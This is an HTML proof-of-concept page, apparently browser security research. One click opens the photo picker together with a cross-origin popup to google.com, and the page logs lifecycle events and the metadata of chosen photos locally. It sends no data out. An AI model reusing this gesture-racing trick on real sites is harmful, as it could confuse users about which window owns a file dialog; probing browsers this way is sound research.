<!DOCTYPE html>
<html lang="en">
<head>
  <title>Photo Picker + Cross-Origin Popup Probe</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #121212;
      color: #e5e5e5;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 24px;
      min-height: 100vh;
    }
    .box {
      max-width: 680px;
      margin: 40px auto;
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 12px;
      padding: 24px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.4);
    }
    h1 {
      font-size: 20px;
      color: #60a5fa;
      margin-bottom: 10px;
      text-align: center;
    }
    p {
      font-size: 13px;
      color: #a3a3a3;
      text-align: center;
      margin-bottom: 18px;
      line-height: 1.5;
    }
    #photoInput {
      display: none;
    }
    #log {
      background: #0b0b0b;
      border: 1px solid #2b2b2b;
      border-radius: 8px;
      padding: 12px;
      font-family: monospace;
      font-size: 11px;
      color: #93c5fd;
      max-height: 260px;
      overflow-y: auto;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>Click anywhere to open Photo Picker + cross-origin popup!</h1>
    <p>Membuka pemilih foto (<code>&lt;input type="file" accept="image/*" multiple&gt;</code>) bersamaan dengan <code>window.open("https://www.google.com", "PoC", "_blank")</code> dan mencatat metadata foto serta siklus hidup halaman.</p>
    <input id="photoInput" type="file" accept="image/*" multiple />
    <div id="log">[*] Waiting for click gesture...</div>
  </div>

  <script>
  (function () {
    'use strict';

    var photoInput = document.getElementById('photoInput');
    var logEl = document.getElementById('log');
    var t0 = performance.now();
    var triggered = false;

    function log(msg) {
      var elapsed = (performance.now() - t0).toFixed(1);
      var line = `[+${elapsed}ms] ${msg}`;
      logEl.textContent += '\n' + line;
      logEl.scrollTop = logEl.scrollHeight;
      console.log('[PhotoPopupProbe] ' + line);
    }

    ['blur', 'focus', 'visibilitychange', 'pagehide'].forEach(function (evName) {
      var target = (evName === 'visibilitychange') ? document : window;
      target.addEventListener(evName, function (e) {
        log(
          `event:${evName} -> origin=${window.location.origin}, hidden=${document.hidden}, ` +
          `persisted=${Boolean(e && e.persisted)}`
        );
      });
    });

    photoInput.addEventListener('change', function () {
      var files = Array.from(photoInput.files || []);
      if (!files.length) {
        log('[*] Photo picker closed without selected files.');
        return;
      }

      files.forEach(function (file, idx) {
        var objUrl = URL.createObjectURL(file);
        var img = new Image();
        img.onload = function () {
          log(
            `[+] Foto #${idx + 1}: name="${file.name}", type="${file.type || 'unknown'}", ` +
            `size=${file.size}B, dim=${img.naturalWidth}x${img.naturalHeight}`
          );
          URL.revokeObjectURL(objUrl);
        };
        img.onerror = function () {
          log(
            `[+] Foto #${idx + 1}: name="${file.name}", type="${file.type || 'unknown'}", size=${file.size}B`
          );
          URL.revokeObjectURL(objUrl);
        };
        img.src = objUrl;
      });
    });

    document.addEventListener('click', function () {
      if (triggered) return;
      triggered = true;

      log('[*] Opening image file picker...');
      if (typeof photoInput.showPicker === 'function') {
        try {
          photoInput.showPicker();
        } catch (err) {
          photoInput.click();
        }
      } else {
        photoInput.click();
      }

      var popup = window.open('https://www.google.com', 'PoC', '_blank');
      log(popup ? '[+] window.open("https://www.google.com", "PoC", "_blank") opened.' : '[-] window.open blocked or null.');
    }, { once: true });
  })();
  </script>
</body>
</html>
